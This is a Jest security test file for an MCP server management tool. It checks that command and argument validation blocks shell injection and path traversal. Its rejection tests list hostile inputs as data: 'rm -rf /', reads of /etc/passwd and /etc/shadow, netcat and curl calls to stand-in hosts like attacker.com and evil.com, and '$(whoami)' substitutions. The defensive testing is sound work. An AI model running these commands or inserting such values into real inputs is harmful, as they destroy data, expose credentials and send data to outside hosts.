/**
 * Security tests for NCP Management Tool
 * Tests command injection validation and security features
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { NCPManagementMCP } from '../src/internal-mcps/ncp-management.js';
import { ProfileManager } from '../src/profiles/profile-manager.js';
import type { NCPOrchestrator } from '../src/orchestrator/ncp-orchestrator.js';
import * as fs from 'fs/promises';
import * as path from 'path';
import { tmpdir } from 'os';

describe('NCP Management Security', () => {
  let managementTool: NCPManagementMCP;
  let profileManager: ProfileManager;
  let testProfilesDir: string;
  let mockOrchestrator: NCPOrchestrator;

  beforeEach(async () => {
    // Create temporary profiles directory for testing
    testProfilesDir = path.join(tmpdir(), `ncp-test-profiles-${Date.now()}`);
    await fs.mkdir(testProfilesDir, { recursive: true });

    // Mock ProfileManager to use test directory
    profileManager = new ProfileManager();
    (profileManager as any).profilesDir = testProfilesDir;
    await profileManager.initialize(true);

    // Create mock orchestrator
    mockOrchestrator = {
      refreshMCPCache: jest.fn<() => Promise<void>>().mockResolvedValue(undefined)
    } as any;

    managementTool = new NCPManagementMCP(profileManager, mockOrchestrator);
  });

  afterEach(async () => {
    // Clean up test profiles directory
    try {
      await fs.rm(testProfilesDir, { recursive: true, force: true });
    } catch (e) {
      // Ignore cleanup errors
    }
    jest.clearAllMocks();
  });

  describe('command injection validation', () => {
    it('should accept safe commands', async () => {
      const safeCommands = [
        { command: 'node', args: ['server.js'] },
        { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem'] },
        { command: 'python', args: ['-m', 'mcp_server'] },
        { command: 'python3', args: ['app.py'] },
        { command: 'docker', args: ['run', 'mcp-server'] }
      ];

      for (const { command, args } of safeCommands) {
        const result = await managementTool.handleAdd({
          mcp_name: `test-${command}`,
          command,
          args,
          profile: 'all'
        });

        expect(result.success).toBe(true);
        expect(result.error).toBeUndefined();
      }
    });

    it('should block shell metacharacters in command', async () => {
      const dangerousCommands = [
        'node; rm -rf /',
        'node && cat /etc/passwd',
        'node | nc attacker.com 1234',
        'node `whoami`',
        'node $(curl evil.com)',
        'node > /dev/null',
        'node < /etc/shadow',
        'node () { :;};',
        'node & echo hacked'
      ];

      for (const command of dangerousCommands) {
        const result = await managementTool.handleAdd({
          mcp_name: 'test-dangerous',
          command,
          args: ['server.js'],
          profile: 'all'
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('Security validation failed');
        expect(result.error).toContain('dangerous shell metacharacters');
      }
    });

    it('should block dangerous characters in arguments', async () => {
      const dangerousArgs = [
        ['server.js; rm -rf /'],
        ['--option=$(whoami)'],
        ['file.txt && cat /etc/passwd'],
        ['input|nc attacker.com 1234'],
        ['`curl evil.com`'],
        ['$(malicious_command)']
      ];

      for (const args of dangerousArgs) {
        const result = await managementTool.handleAdd({
          mcp_name: 'test-dangerous-args',
          command: 'node',
          args,
          profile: 'all'
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('Security validation failed');
        expect(result.error).toContain('dangerous characters');
      }
    });

    it('should block path traversal attempts', async () => {
      const pathTraversalCommands = [
        '../../../bin/bash',
        'node/../../../usr/bin/malicious',
        '../../evil/script.sh'
      ];

      for (const command of pathTraversalCommands) {
        const result = await managementTool.handleAdd({
          mcp_name: 'test-path-traversal',
          command,
          args: [],
          profile: 'all'
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('Security validation failed');
        expect(result.error).toContain('path traversal');
      }
    });

    it('should reject empty or non-string commands', async () => {
      const invalidCommands = [
        { command: '', args: ['test'] },
        { command: null as any, args: ['test'] },
        { command: undefined as any, args: ['test'] }
      ];

      for (const { command, args } of invalidCommands) {
        const result = await managementTool.handleAdd({
          mcp_name: 'test-invalid',
          command,
          args,
          profile: 'all'
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('Security validation failed');
      }
    });

    it('should reject non-string arguments', async () => {
      const result = await managementTool.handleAdd({
        mcp_name: 'test-invalid-args',
        command: 'node',
        args: ['valid', 123 as any, 'string'],
        profile: 'all'
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security validation failed');
      expect(result.error).toContain('must be strings');
    });

    it('should accept absolute paths without path traversal', async () => {
      const result = await managementTool.handleAdd({
        mcp_name: 'test-absolute-path',
        command: '/usr/local/bin/node',
        args: ['/opt/mcp/server.js'],
        profile: 'all'
      });

      // Should succeed as long as no ../ is present
      expect(result.success).toBe(true);
    });

    it('should accept complex but safe arguments', async () => {
      const result = await managementTool.handleAdd({
        mcp_name: 'test-complex-args',
        command: 'npx',
        args: [
          '-y',
          '@modelcontextprotocol/server-github',
          '--token',
          'github_pat_XXXXXXXXXXXXXXXX',
          '--repo',
          'owner/repo'
        ],
        profile: 'all'
      });

      expect(result.success).toBe(true);
    });
  });

  describe('HTTP MCP security', () => {
    it('should accept HTTP MCPs without validation errors', async () => {
      const result = await managementTool.handleAdd({
        mcp_name: 'test-http-mcp',
        url: 'http://localhost:3000/mcp',
        profile: 'all'
      });

      expect(result.success).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('should accept HTTPS MCPs', async () => {
      const result = await managementTool.handleAdd({
        mcp_name: 'test-https-mcp',
        url: 'https://api.example.com/mcp',
        profile: 'all'
      });

      expect(result.success).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('should not apply command validation to HTTP MCPs', async () => {
      // HTTP MCPs don't have commands, so validation should not apply
      const result = await managementTool.handleAdd({
        mcp_name: 'test-http-only',
        url: 'http://localhost:3000/mcp',
        auth: {
          type: 'bearer',
          token: 'test_token_$(whoami)' // Even this should be OK for HTTP
        },
        profile: 'all'
      });

      // Should succeed because command validation doesn't apply to HTTP
      expect(result.success).toBe(true);
    });
  });

  describe('security edge cases', () => {
    it('should handle unicode characters safely', async () => {
      const result = await managementTool.handleAdd({
        mcp_name: 'test-unicode',
        command: 'node',
        args: ['--name=测试服务器', '--emoji=🚀'],
        profile: 'all'
      });

      expect(result.success).toBe(true);
    });

    it('should handle long but safe arguments', async () => {
      const longButSafeArg = 'a'.repeat(1000);
      const result = await managementTool.handleAdd({
        mcp_name: 'test-long-arg',
        command: 'node',
        args: ['--data', longButSafeArg],
        profile: 'all'
      });

      expect(result.success).toBe(true);
    });

    it('should handle special characters that are safe', async () => {
      const result = await managementTool.handleAdd({
        mcp_name: 'test-special-chars',
        command: 'node',
        args: [
          '--option=value',
          'file-name.js',
          '@scope/package',
          'path/to/file',
          'name_with_underscore',
          'name-with-dash'
        ],
        profile: 'all'
      });

      expect(result.success).toBe(true);
    });
  });
});
